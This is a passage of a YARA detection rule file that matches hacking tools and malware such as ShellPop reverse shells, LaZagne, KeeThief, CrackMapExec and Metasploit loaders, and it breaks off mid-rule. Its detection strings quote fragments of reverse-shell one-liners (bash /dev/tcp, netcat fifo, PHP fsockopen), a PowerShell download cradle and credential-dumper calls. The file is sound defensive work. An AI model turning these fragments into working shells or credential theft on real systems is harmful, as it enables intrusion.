   Date: 2017-07-27
   Identifier: AllTheThings
   Reference: https://github.com/subTee/AllTheThings
*/

/* Rule Set ----------------------------------------------------------------- */

rule AllTheThings {
   meta:
      description = "Detects AllTheThings"
      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
      reference = "https://github.com/subTee/AllTheThings"
      date = "2017-07-27"
      modified = "2022-12-21"
      hash1 = "5a0e9a9ce00d843ea95bd5333b6ab50cc5b1dbea648cc819cfe48482513ce842"
      id = "c3169ca7-3482-5d55-a1d9-6d1c01349922"
   strings:
      $x1 = "\\obj\\Debug\\AllTheThings.pdb" ascii
      $x2 = "AllTheThings.exe" fullword wide
      $x3 = "\\AllTheThings.dll" ascii
      $x4 = "Hello From Main...I Don't Do Anything" fullword wide
      $x5 = "I am a basic COM Object" fullword wide
      $x6 = "I shouldn't really execute either." fullword wide
   condition:
      ( uint16(0) == 0x5a4d and filesize < 50KB and 1 of them )
}

rule Impacket_Keyword {
   meta:
      description = "Detects Impacket Keyword in Executable"
      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
      reference = "Internal Research"
      date = "2017-08-04"
      score = 60
      hash1 = "9388c78ea6a78dbea307470c94848ae2481481f593d878da7763e649eaab4068"
      hash2 = "2f6d95e0e15174cfe8e30aaa2c53c74fdd13f9231406b7103da1e099c08be409"
      id = "a92962e6-1b05-583b-8b06-f226bdea88e2"
   strings:
      $s1 = "impacket.smb(" ascii
      $s2 = "impacket.ntlm(" ascii
      $s3 = "impacket.nmb(" ascii
   condition:
      ( uint16(0) == 0x5a4d and filesize < 14000KB and 1 of them )
}

/*
   Yara Rule Set
   Author: Florian Roth
   Date: 2017-08-27
   Reference: PasswordPro
*/

/* Rule Set ----------------------------------------------------------------- */

import "pe"

rule PasswordsPro {
   meta:
      description = "Auto-generated rule - file PasswordsPro.exe"
      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
      reference = "PasswordPro"
      date = "2017-08-27"
      hash1 = "5b3d6654e6d9dc49ee1136c0c8e8122cb0d284562447abfdc05dfe38c79f95bf"
      id = "c749f883-364e-5f65-9eb8-3dcd74495f7c"
   strings:
      $s1 = "No users marked for attack or all marked users already have passwords found!" fullword ascii
      $s2 = "%s\\PasswordsPro.ini.Dictionaries(%d)" fullword ascii
      $s3 = "Passwords processed since attack start:" fullword ascii
   condition:
      ( uint16(0) == 0x5a4d and
        filesize < 2000KB and
         1 of them
      )
}

rule PasswordPro_NTLM_DLL {
   meta:
      description = "Auto-generated rule - file NTLM.dll"
      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
      reference = "PasswordPro"
      date = "2017-08-27"
      hash1 = "47d4755d31bb96147e6230d8ea1ecc3065da8e557e8176435ccbcaea16fe50de"
      id = "cc86b868-000f-56b1-91cd-4aa8caace1df"
   strings:
      $s1 = "NTLM.dll" fullword ascii
      $s2 = "Algorithm: NTLM" fullword ascii
   condition:
      ( uint16(0) == 0x5a4d and
        filesize < 20KB and
        pe.exports("GetHash") and pe.exports("GetInfo") and
        ( all of them )
      )
}

/*
   Yara Rule Set
   Author: Florian Roth
   Date: 2017-08-29
   Identifier: KeeTheft
   Reference: https://github.com/HarmJ0y/KeeThief
*/

/* Rule Set ----------------------------------------------------------------- */

rule KeeThief_PS {
   meta:
      description = "Detects component of KeeTheft - KeePass dump tool - file KeeThief.ps1"
      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
      reference = "https://github.com/HarmJ0y/KeeThief"
      date = "2017-08-29"
      hash1 = "a3b976279ded8e64b548c1d487212b46b03aaec02cb6e199ea620bd04b8de42f"
      id = "9a54e8d1-3cae-51e8-8da0-024ac25dc6d0"
   strings:
      $x1 = "$WMIProcess = Get-WmiObject win32_process -Filter \"ProcessID = $($KeePassProcess.ID)\"" fullword ascii
      $x2 = "if($KeePassProcess.FileVersion -match '^2\\.') {" fullword ascii
   condition:
      ( uint16(0) == 0x7223 and
        filesize < 1000KB and
        ( 1 of ($x*) )
      )
}

rule KeeTheft_EXE {
   meta:
      description = "Detects component of KeeTheft - KeePass dump tool - file KeeTheft.exe"
      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
      reference = "https://github.com/HarmJ0y/KeeThief"
      date = "2017-08-29"
      hash1 = "f06789c3e9fe93c165889799608e59dda6b10331b931601c2b5ae06ede41dc22"
      id = "65531239-c5fa-5285-8f44-2d858e211c9b"
   strings:
      $x1 = "Error: Could not create a thread for the shellcode" fullword wide
      $x2 = "Could not find address marker in shellcode" fullword wide
      $x3 = "GenerateDecryptionShellCode" fullword ascii
      $x4 = "KeePassLib.Keys.KcpPassword" fullword wide
      $x5 = "************ Found a CompositeKey! **********" fullword wide
      $x6 = "*** Interesting... there are multiple .NET runtimes loaded in KeePass" fullword wide
      $x7 = "GetKcpPasswordInfo" fullword ascii
   condition:
      ( uint16(0) == 0x5a4d and filesize < 200KB and 2 of them )
}

rule KeeTheft_Out_Shellcode {
   meta:
      description = "Detects component of KeeTheft - KeePass dump tool - file Out-Shellcode.ps1"
      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
      reference = "https://github.com/HarmJ0y/KeeThief"
      date = "2017-08-29"
      hash1 = "2afb1c8c82363a0ae43cad9d448dd20bb7d2762aa5ed3672cd8e14dee568e16b"
      id = "1263ad5d-5d50-50e6-ad78-9d5e4e16634b"
   strings:
      $x1 = "Write-Host \"Shellcode length: 0x$(($ShellcodeLength + 1).ToString('X4'))\"" fullword ascii
      $x2 = "$TextSectionInfo = @($MapContents | Where-Object { $_ -match '\\.text\\W+CODE' })[0]" fullword ascii
   condition:
      ( filesize < 2KB and 1 of them )
}

/*
   Yara Rule Set
   Author: Florian Roth
   Date: 2017-09-23
   Identifier: Sharpire
   Reference: https://github.com/0xbadjuju/Sharpire
*/

rule Sharpire {
   meta:
      description = "Auto-generated rule - file Sharpire.exe"
      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
      reference = "https://github.com/0xbadjuju/Sharpire"
      date = "2017-09-23"
      modified = "2022-12-21"
      hash1 = "327a1dc2876cd9d7f6a5b3777373087296fc809d466e42861adcf09986c6e587"
      id = "747f2798-4f93-5073-b358-969060a1c937"
   strings:
      $x1 = "\\obj\\Debug\\Sharpire.pdb" ascii
      $x2 = "[*] Upload of $fileName successful" fullword wide

      $s1 = "no shell command supplied" fullword wide
      $s2 = "/login/process.php" fullword wide
      $s3 = "invokeShellCommand" fullword ascii
      $s4 = "..Command execution completed." fullword wide
      $s5 = "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko" fullword wide
      $s6 = "/admin/get.php" fullword wide
      $s7 = "[!] Error in stopping job: " fullword wide
   condition:
      ( uint16(0) == 0x5a4d and filesize < 100KB and ( 1 of ($x*) and 3 of them ) )
}

/*
   Yara Rule Set
   Author: Florian Roth
   Date: 2017-09-23
   Identifier: Invoke-Metasploit
   Reference: https://github.com/jaredhaight/Invoke-MetasploitPayload/blob/master/Invoke-MetasploitPayload.ps1
*/

rule Invoke_Metasploit {
   meta:
      description = "Detects Invoke-Metasploit Payload"
      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
      reference = "https://github.com/jaredhaight/Invoke-MetasploitPayload/blob/master/Invoke-MetasploitPayload.ps1"
      date = "2017-09-23"
      hash1 = "b36d3ca7073741c8a48c578edaa6d3b6a8c3c4413e961a83ad08ad128b843e0b"
      id = "40452884-df3f-5b49-ad10-05006cb115f2"
   strings:
      $s1 = "[*] Looks like we're 64bit, using regular powershell.exe" ascii wide
      $s2 = "[*] Kicking off download cradle in a new process"
      $s3 = "Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;Invoke-Expression $client.downloadstring('''+$url+''');'"
   condition:
      ( filesize < 20KB and 1 of them )
}

rule PowerShell_Mal_HackTool_Gen {
   meta:
      description = "Detects PowerShell hack tool samples - generic PE loader"
      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
      reference = "Internal Research"
      date = "2017-11-02"
      hash1 = "d442304ca839d75b34e30e49a8b9437b5ab60b74d85ba9005642632ce7038b32"
      id = "d1fc4594-d816-5d02-bff6-3f220477b555"
   strings:
      $x1 = "$PEBytes32 = 'TVqQAAMAAAAEAAAA" wide
      $x2 = "Write-BytesToMemory -Bytes $Shellcode1 -MemoryAddress $GetCommandLineWAddrTemp" fullword wide
      $x3 = "@($PEBytes64, $PEBytes32, \"Void\", 0, \"\", $ExeArgs)" fullword wide
      $x4 = "(Shellcode: LoadLibraryA.asm)" fullword wide
   condition:
      filesize < 8000KB and 1 of them
}

rule Sig_RemoteAdmin_1 {
   meta:
      description = "Detects strings from well-known APT malware"
      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
      reference = "Internal Research"
      date = "2017-12-03"
      score = 45
      id = "da55084c-ec1f-5800-a614-189dce7b5820"
   strings:
      $ = "Radmin, Remote Administrator" wide
      $ = "Radmin 3.0" wide
   condition:
      uint16(0) == 0x5a4d and filesize < 3000KB and 1 of them
}

rule RemCom_RemoteCommandExecution {
   meta:
      description = "Detects strings from RemCom tool"
      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
      reference = "https://goo.gl/tezXZt"
      date = "2017-12-28"
      score = 50
      id = "90b4ce3c-a690-5b6e-95e8-7e5dc8270152"
   strings:
      $ = "\\\\.\\pipe\\%s%s%d"
      $ = "%s\\pipe\\%s%s%d%s"
      $ = "\\ADMIN$\\System32\\%s%s"
   condition:
      1 of them
}

rule Crackmapexec_EXE {
   meta:
      description = "Detects CrackMapExec hack tool"
      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
      reference = "Internal Research"
      date = "2018-04-06"
      score = 85
      hash1 = "371f104b7876b9080c519510879235f36edb6668097de475949b84ab72ee9a9a"
      id = "9fcfba98-7ba1-5810-99b7-62ad2b1aa4c0"
   strings:
      $s1 = "core.scripts.secretsdump(" ascii
      $s2 = "core.scripts.samrdump(" ascii
      $s3 = "core.uacdump(" ascii
   condition:
      uint16(0) == 0x5a4d and filesize < 10000KB and 2 of them
}

rule SUSP_Imphash_PassRevealer_PY_EXE {
   meta:
      description = "Detects an imphash used by password revealer and hack tools (some false positives with hardware driver installers)"
      author = "Florian Roth (Nextron Systems)"
      reference = "Internal Research"
      date = "2018-04-06"
      modified = "2021-11-09"
      score = 40
      hash1 = "371f104b7876b9080c519510879235f36edb6668097de475949b84ab72ee9a9a"
      id = "9462dfc4-2feb-591d-ac0c-ba02f093c216"
   strings:
      $fp1 = "Assmann Electronic GmbH" ascii wide
      $fp2 = "Oculus VR" ascii wide
      $fp3 = "efm8load" ascii /* Corsair software */
   condition:
      uint16(0) == 0x5a4d and filesize < 10000KB
      and pe.imphash() == "ed61beebc8d019dd9bec823e2d694afd"
      and not 1 of ($fp*)
}

rule MAL_Unknown_PWDumper_Apr18_3 {
   meta:
      description = "Detects sample from unknown sample set - IL origin"
      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
      reference = "Internal Research"
      date = "2018-04-06"
      hash1 = "d435e7b6f040a186efeadb87dd6d9a14e038921dc8b8658026a90ae94b4c8b05"
      hash2 = "8c35c71838f34f7f7a40bf06e1d2e14d58d9106e6d4e6f6e9af732511a126276"
      id = "2431d562-dcd8-5d21-8406-7d2567b6eca9"
   strings:
      $s1 = "loaderx86.dll" fullword ascii
      $s2 = "tcpsvcs.exe" fullword wide
      $s3 = "%Program Files, Common FOLDER%" fullword wide
      $s4 = "%AllUsers, ApplicationData FOLDER%" fullword wide
      $s5 = "loaderx86" fullword ascii
      $s6 = "TNtDllHook$" fullword ascii
   condition:
      uint16(0) == 0x5a4d and filesize < 3000KB and all of them
}

rule ProcessInjector_Gen : HIGHVOL {
   meta:
      description = "Detects a process injection utility that can be used ofr good and bad purposes"
      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
      reference = "https://github.com/cuckoosandbox/monitor/blob/master/bin/inject.c"
      date = "2018-04-23"
      score = 60
      hash1 = "456c1c25313ce2e2eedf24fdcd4d37048bcfff193f6848053cbb3b5e82cd527d"
      id = "9b0b6ac7-8432-5f93-b389-c2356ec75113"
   strings:
      $x1 = "Error injecting remote thread in process:" fullword ascii
      $s5 = "[-] Error getting access to process: %ld!" fullword ascii
      $s6 = "--process-name <name>  Process name to inject" fullword ascii
      $s12 = "No injection target has been provided!" fullword ascii
      $s17 = "[-] An app path is required when not injecting!" fullword ascii
   condition:
      uint16(0) == 0x5a4d and filesize < 50KB and (
         pe.imphash() == "d27e0fa013d7ae41be12aaf221e41f9b" or
         1 of them
      ) or 3 of them
}

rule Lazagne_PW_Dumper {
   meta:
      description = "Detects Lazagne PW Dumper"
      author = "Markus Neis / Florian Roth"
      reference = "https://github.com/AlessandroZ/LaZagne/releases/"
      date = "2018-03-22"
      score = 70
      id = "1904029e-9336-5278-ae2e-4bc853316600"
   strings:
      $s1 = "Crypto.Hash" fullword ascii
      $s2 = "laZagne" fullword ascii
      $s3 = "impacket.winregistry" fullword ascii
   condition:
      3 of them
}

rule HKTL_shellpop_TCLsh {
   meta:
      description = "Detects suspicious TCLsh popshell"
      author = "Tobias Michalski"
      reference = "https://github.com/0x00-0x00/ShellPop"
      date = "2018-05-18"
      hash1 = "9f49d76d70d14bbe639a3c16763d3b4bee92c622ecb1c351cb4ea4371561e133"
      id = "24f6b626-383e-54c9-abd4-bd67c37af937"
   strings:
      $s1 = "{ puts -nonewline $s \"shell>\";flush $s;gets $s c;set e \"exec $c\";if" ascii
   condition:
      filesize < 1KB and 1 of them
}

rule HKTL_shellpop_ruby {
   meta:
      description = "Detects suspicious ruby shellpop"
      author = "Tobias Michalski"
      reference = "https://github.com/0x00-0x00/ShellPop"
      date = "2018-05-18"
      hash1 = "6b425b37f3520fd8c778928cc160134a293db0ce6d691e56a27894354b04f783"
      id = "cb3a93d5-02a1-5a49-b37e-3f9312b993ea"
   strings:
      $x1 = ");while(cmd=c.gets);IO.popen(cmd,'r'){" ascii
   condition:
      filesize < 1KB and all of them
}

rule HKTL_shellpop_awk {
   meta:
      description = "Detects suspicious AWK Shellpop"
      author = "Tobias Michalski"
      reference = "https://github.com/0x00-0x00/ShellPop"
      date = "2018-05-18"
      hash1 = "7513a0a0ba786b0e22a9a7413491b4011f60af11253c596fa6857fb92a6736fc"
      id = "92d1e6dd-d758-5df2-b5e5-eb275964551d"
   strings:
      $s1 = "awk 'BEGIN {s = \"/inet/tcp/0/" ascii
      $s2 = "; while(42) " ascii
   condition:
      filesize < 1KB and 1 of them
}

rule HKTL_shellpop_Netcat_UDP {
   meta:
      description = "Detects suspicious netcat popshell"
      author = "Tobias Michalski"
      reference = "https://github.com/0x00-0x00/ShellPop"
      date = "2018-05-18"
      hash1 = "d823ad91b315c25893ce8627af285bcf4e161f9bbf7c070ee2565545084e88be"
      id = "67aa53b6-00bc-5d2e-b6f3-37e9121cdd01"
   strings:
      $s1 = "mkfifo fifo ; nc.traditional -u" ascii
      $s2 = "< fifo | { bash -i; } > fifo" fullword ascii
   condition:
      filesize < 1KB and 1 of them
}

rule HKTL_shellpop_socat {
   meta:
      description = "Detects suspicious socat popshell"
      author = "Tobias Michalski"
      reference = "https://github.com/0x00-0x00/ShellPop"
      date = "2018-05-18"
      hash1 = "267f69858a5490efb236628260b275ad4bbfeebf4a83fab8776e333ca706a6a0"
      id = "23c331ba-217c-5b17-b45e-d553eea76a56"
   strings:
      $s1 = "socat tcp-connect" ascii
      $s2 = ",pty,stderr,setsid,sigint,sane" ascii
   condition:
      filesize < 1KB and 2 of them
}

rule HKTL_shellpop_Perl {
   meta:
      description = "Detects Shellpop Perl script"
      author = "Tobias Michalski"
      reference = "https://github.com/0x00-0x00/ShellPop"
      date = "2018-05-18"
      hash1 = "32c3e287969398a070adaad9b819ee9228174c9cb318d230331d33cda51314eb"
      id = "d597d213-a70b-5412-adde-791b4d498848"
   strings:
      $ = "perl -e 'use IO::Socket::INET;$|=1;my ($s,$r);" ascii
      $ = ";STDIN->fdopen(\\$c,r);$~->fdopen(\\$c,w);s" ascii
   condition:
      filesize < 2KB and 1 of them
}

rule HKTL_shellpop_Python {
   meta:
      description = "Detects malicious python shell"
      author = "Tobias Michalski"
      reference = "https://github.com/0x00-0x00/ShellPop"
      date = "2018-05-18"
      hash1 = "aee1c9e45a1edb5e462522e266256f68313e2ff5956a55f0a84f33bc6baa980b"
      id = "62fe0ae9-422e-5021-8a67-e88ff4bd2cf3"
   strings:
      $ = "os.putenv('HISTFILE', '/dev/null');" ascii
   condition:
      filesize < 2KB and 1 of them
}

rule HKTL_shellpop_PHP_TCP {
   meta:
      description = "Detects malicious PHP shell"
      author = "Tobias Michalski"
      reference = "https://github.com/0x00-0x00/ShellPop"
      date = "2018-05-18"
      hash1 = "0412e1ab9c672abecb3979a401f67d35a4a830c65f34bdee3f87e87d060f0290"
      id = "3bafc225-62e5-5183-84aa-9c3406b6c444"
   strings:
      $x1 = "php -r \"\\$sock=fsockopen" ascii
      $x2 = ";exec('/bin/sh -i <&3 >&3 2>&3');\"" ascii
   condition:
      filesize < 3KB and all of them
}

rule HKTL_shellpop_Powershell_TCP {
   meta:
      description = "Detects malicious powershell"
      author = "Tobias Michalski"
      reference = "https://github.com/0x00-0x00/ShellPop"
      date = "2018-05-18"
      hash1 = "8328806700696ffe8cc37a0b81a67a6e9c86bb416364805b8aceaee5db17333f"
      id = "4f3a92db-f686-559a-9588-fb79f423c51f"
   strings:
      $ = "Something went wrong with execution of command on the target" ascii
      $ = ";[byte[]]$bytes = 0..65535|%{0};$sendbytes =" ascii
   condition:
      filesize < 3KB and 1 of them
}

rule SUSP_Powershell_ShellCommand_May18_1 {
   meta:
      description = "Detects a supcicious powershell commandline"
      author = "Tobias Michalski"
      reference = "https://github.com/0x00-0x00/ShellPop"
      date = "2018-05-18"
      hash1 = "8328806700696ffe8cc37a0b81a67a6e9c86bb416364805b8aceaee5db17333f"
      id = "efa81fd0-b764-5a1a-98a5-fc3135be220b"
   strings:
      $x1 = "powershell -nop -ep bypass -Command" ascii
   condition:
      filesize < 3KB and 1 of them

}

rule HKTL_shellpop_Telnet_TCP {
   meta:
      description = "Detects malicious telnet shell"
      author = "Tobias Michalski"
      reference = "https://github.com/0x00-0x00/ShellPop"
      date = "2018-05-18"
      hash1 = "cf5232bae0364606361adafab32f19cf56764a9d3aef94890dda9f7fcd684a0e"
      id = "dbd5cc65-c6f1-54f3-813f-7a7f9bcca184"
   strings:
      $x1 = "if [ -e /tmp/f ]; then rm /tmp/f;" ascii
      $x2 = "0</tmp/f|/bin/bash 1>/tmp/f" fullword ascii
   condition:
      filesize < 3KB and 1 of them
}

rule SUSP_shellpop_Bash {
   meta:
      description = "Detects susupicious bash command"
      author = "Tobias Michalski"
      reference = "https://github.com/0x00-0x00/ShellPop"
      date = "2018-05-18"
      modified = "2025-04-11"
      score = 70
      hash1 = "36fad575a8bc459d0c2e3ad626e97d5cf4f5f8bedc56b3cc27dd2f7d88ed889b"
      id = "771b7d01-272a-5986-af07-7417b84c52ed"
   strings:
      $x1 = "bash -i >& /dev/tcp/" ascii
      $x2 = "bash -i >& /dev/tcp/" ascii base64

      $fp1 = "bash -i >& /dev/tcp/IP/PORT" ascii
   condition:
      1 of ($x*) and not 1 of ($fp*)
}

rule HKTL_shellpop_netcat {
   meta:
      description = "Detects suspcious netcat shellpop"
      author = "Tobias Michalski"
      reference = "https://github.com/0x00-0x00/ShellPop"
      date = "2018-05-18"
      hash1 = "98e3324f4c096bb1e5533114249a9e5c43c7913afa3070488b16d5b209e015ee"
      id = "cd55e912-b57b-5fce-98eb-5a0cd27a6e4d"
   strings:
      $s1 = "if [ -e /tmp/f ]; then rm /tmp/f;"  ascii
      $s2 = "fi;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc" ascii
      $s4 = "mknod /tmp/f p && nc" ascii
      $s5 = "</tmp/f|/bin/bash 1>/tmp/f"  ascii
    condition:
      filesize < 2KB and 1 of them
}


rule HKTL_beRootexe {
   meta:
      description = "Detects beRoot.exe which checks common Windows missconfigurations"
      author = "yarGen Rule Generator"
      reference = "https://github.com/AlessandroZ/BeRoot/tree/master/Windows"
      date = "2018-07-25"
      hash1 = "865b3b8ec9d03d3475286c3030958d90fc72b21b0dca38e5bf8e236602136dd7"
      id = "b91c2e0b-2e47-5339-bf48-eaa8329ea63b"
   strings:
      $s1 = "checks.webclient.secretsdump(" ascii
      $s2 = "beroot.modules" fullword ascii
      $s3 = "beRoot.exe.manifest" fullword ascii
   condition:
      ( uint16(0) == 0x5a4d and
        filesize < 18000KB and
        1 of them)
}

rule HKTL_beRootexe_output {
   meta:
      description = "Detects the output of beRoot.exe"
      author = "Tobias Michalski"
      reference = "https://github.com/AlessandroZ/BeRoot/tree/master/Windows"
      date = "2018-07-25"
      id = "dfd11915-443f-5ce9-b94a-bdcb0e62104e"
   strings:
      $s1 = "permissions: {'change_config'" fullword wide
      $s2 = "Full path: C:\\Windows\\system32\\msiexec.exe /V" fullword wide
      $s3 = "Full path: C:\\Windows\\system32\\svchost.exe -k DevicesFlow" fullword wide
      $s4 = "! BANG BANG !" fullword wide
   condition:
      filesize < 400KB and 3 of them
}

rule HKTL_EmbeddedPDF {
   meta:
      description = "Detects Embedded PDFs which can start malicious content"
      author = "Tobias Michalski"
      reference = "https://twitter.com/infosecn1nja/status/1021399595899731968?s=12"
      date = "2018-07-25"
      id = "d4e2d878-fb75-54c5-9879-fe94102911d1"
   strings:
      $x1 = "/Type /Action\n /S /JavaScript\n /JS (this.exportDataObject({" fullword ascii

      $s1 = "(This PDF document embeds file" fullword ascii
      $s2 = "/Names << /EmbeddedFiles << /Names" fullword ascii
      $s3 = "/Type /EmbeddedFile" fullword ascii

   condition:
      uint16(0) == 0x5025 and
      2 of ($s*) and $x1
}

rule HTKL_BlackBone_DriverInjector {
   meta:
      description = "Detects BlackBone Driver injector"
      author = "Florian Roth (Nextron Systems)"
      reference = "https://github.com/DarthTon/Blackbone"
      date = "2018-09-11"
      score = 60
      hash1 = "8062a4284c719412270614458150cb4abbdf77b2fc35f770ce9c45d10ccb1f4d"
      hash2 = "2d2fc27200c22442ac03e2f454b6e1f90f2bbc17017f05b09f7824fac6beb14b"
      hash3 = "e45da157483232d9c9c72f44b13fca2a0d268393044db00104cc1afe184ca8d1"
      id = "0d992a6c-c57a-5895-af0d-9c167d922601"
   strings:
      $s1 = "=INITtH=PAGEtA" fullword ascii
      $s2 = "BBInjectDll" fullword ascii
      $s3 = "LdrLoadDll" fullword ascii
      $s4 = "\\??\\pipe\\%ls" fullword wide
      $s5 = "Failed to retrieve Kernel base address. Aborting" fullword ascii

      $x2 = "BlackBone: %s: APC injection failed with status 0x%X" fullword ascii
      $x3 = "BlackBone: PDE_BASE/PTE_BASE not found " fullword ascii
      $x4 = "%s: Invalid injection type specified - %d" fullword ascii
      $x6 = "Trying to map C:\\windows\\system32\\cmd.exe into current process" fullword wide
      $x7 = "\\BlackBoneDrv\\bin\\" ascii
      $x8 = "DosDevices\\BlackBone" wide
   condition:
      uint16(0) == 0x5a4d and filesize < 8000KB and ( 3 of them or 1 of ($x*) )
}

rule HKTL_SqlMap {
   meta:
      description = "Detects sqlmap hacktool"
      author = "Florian Roth (Nextron Systems)"
      reference = "https://github.com/sqlmapproject/sqlmap"
      date = "2018-10-09"
      hash1 = "9444478b03caf7af853a64696dd70083bfe67f76aa08a16a151c00aadb540fa8"
      id = "da2029dd-c4ce-557f-a409-c468fa3deef3"
   strings:
      $x1 = "if cmdLineOptions.get(\"sqlmapShell\"):" fullword ascii
      $x2 = "if conf.get(\"dumper\"):" fullword ascii
   condition:
      filesize < 50KB and 1 of them
}

rule HKTL_SqlMap_backdoor {
   meta:
      description = "Detects SqlMap backdoors"
      author = "Florian Roth (Nextron Systems)"
      reference = "https://github.com/sqlmapproject/sqlmap"
      date = "2018-10-09"
      id = "bf09caac-cf15-5936-b5b4-df4f28788961"
   condition:
      ( uint32(0) == 0x8e859c07 or
         uint32(0) == 0x2d859c07 or
         uint32(0) == 0x92959c07 or
         uint32(0) == 0x929d9c07 or
         uint32(0) == 0x29959c07 or
         uint32(0) == 0x2b8d9c07 or
         uint32(0) == 0x2b859c07 or
         uint32(0) == 0x28b59c07 ) and filesize < 2KB
}

rule HKTL_Lazagne_PasswordDumper_Dec18_1 {
   meta:
      description = "Detects password dumper Lazagne often used by middle eastern threat groups"
      author = "Florian Roth (Nextron Systems)"
      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      reference = "https://www.symantec.com/blogs/threat-intelligence/seedworm-espionage-group"
      date = "2018-12-11"
      score = 85
      hash1 = "1205f5845035e3ee30f5a1ced5500d8345246ef4900bcb4ba67ef72c0f79966c"
      hash2 = "884e991d2066163e02472ea82d89b64e252537b28c58ad57d9d648b969de6a63"
      hash3 = "bf8f30031769aa880cdbe22bc0be32691d9f7913af75a5b68f8426d4f0c7be50"
      id = "bae48a4d-33b6-55b9-abf5-daf87e5da9e9"
   strings:
      $s1 = "softwares.opera(" ascii
      $s2 = "softwares.mozilla(" ascii
      $s3 = "config.dico(" ascii
      $s4 = "softwares.chrome(" ascii
      $s5 = "softwares.outlook(" ascii
   condition:
      uint16(0) == 0x5a4d and filesize < 17000KB and 1 of them
}

rule HKTL_Lazagne_Gen_18 {
   meta:
      description = "Detects Lazagne password extractor hacktool"
      author = "Florian Roth (Nextron Systems)"
      reference = "https://github.com/AlessandroZ/LaZagne"
      license = "https://creativecommons.org/licenses/by-nc/4.0/"
      date = "2018-12-11"
      score = 80
      hash1 = "51121dd5fbdfe8db7d3a5311e3e9c904d644ff7221b60284c03347938577eecf"
      id = "034ea6d8-f5cf-5664-9ff9-24d19403093d"
   strings:
      $x1 = "lazagne.config.powershell_execute(" ascii
      $x2 = "creddump7.win32." ascii
      $x3 = "lazagne.softwares.windows.hashdump" ascii
      $x4 = ".softwares.memory.libkeepass.common(" ascii
   condition:
      2 of them
}

rule HKTL_NoPowerShell {
   meta:
      description = "Detects NoPowerShell hack tool"
      author = "Florian Roth (Nextron Systems)"
      reference = "https://github.com/bitsadmin/nopowershell"
      date = "2018-12-28"
      modified = "2022-12-21"
      hash1 = "2dad091dd00625762a7590ce16c3492cbaeb756ad0e31352a42751deb7cf9e70"
      id = "17d508d5-833f-5232-a071-dbed8758493b"
   strings:
      $x1 = "\\NoPowerShell.pdb" ascii
      $x2 = "Invoke-WmiMethod -Class Win32_Process -Name Create \"cmd" fullword wide
      $x3 = "ls C:\\Windows\\System32 -Include *.exe | select -First 10 Name,Length" fullword wide
      $x4 = "ls -Recurse -Force C:\\Users\\ -Include *.kdbx" fullword wide
      $x5 = "NoPowerShell.exe" fullword wide
   condition:
      1 of them
}
rule HKTL_htran_go {
   meta:
      author = "Jeff Beley"
      hash1 = "4acbefb9f7907c52438ebb3070888ddc8cddfe9e3849c9d0196173a422b9035f"
      description = "Detects go based htran variant"
      date = "2019-01-09"
      id = "bd9409e3-3d4c-57d6-af60-b6d6bd93d46b"
   strings:
      $s1 = "https://github.com/cw1997/NATBypass" fullword ascii
      $s2 = "-slave ip1:port1 ip2:port2" fullword ascii
      $s3 = "-tran port1 ip:port2" fullword ascii
   condition:
      uint16(0) == 0x5a4d and filesize < 7000KB and 1 of them
}

rule SUSP_Katz_PDB {
   meta:
      description = "Detects suspicious PDB in file"
      author = "Florian Roth (Nextron Systems)"
      reference = "Internal Research"
      date = "2019-02-04"
      hash1 = "6888ce8116c721e7b2fc3d7d594666784cf38a942808f35e309a48e536d8e305"
      id = "79f4f07c-b234-5203-a2ab-aba4a9cb9f8d"
   strings:
      $s1 = /\\Release\\[a-z]{0,8}katz.pdb/
      $s2 = /\\Debug\\[a-z]{0,8}katz.pdb/
   condition:
      uint16(0) == 0x5a4d and filesize < 6000KB and all of them
}

rule HKTL_LNX_Pnscan {
   meta:
      description = "Detects Pnscan port scanner"
      author = "Florian Roth (Nextron Systems)"
      reference = "https://github.com/ptrrkssn/pnscan"
      date = "2019-05-27"
      score = 55
      id = "46c6c0d9-08bb-5de3-ad14-c1a7ab0542c6"
   strings:
      $x1 = "-R<hex list>   Hex coded response string to look for." fullword ascii
      $x2 = "This program implements a multithreaded TCP port scanner." ascii wide
   condition:
      filesize < 6000KB and 1 of them
}

rule PAExec {
   meta:
      description = "Detects remote access tool PAEXec (like PsExec) - file PAExec.exe"
      author = "Florian Roth (Nextron Systems)"
      reference = "http://researchcenter.paloaltonetworks.com/2017/03/unit42-shamoon-2-delivering-disttrack/"
      date = "2017-03-27"
      score = 40
      hash1 = "01a461ad68d11b5b5096f45eb54df9ba62c5af413fa9eb544eacb598373a26bc"
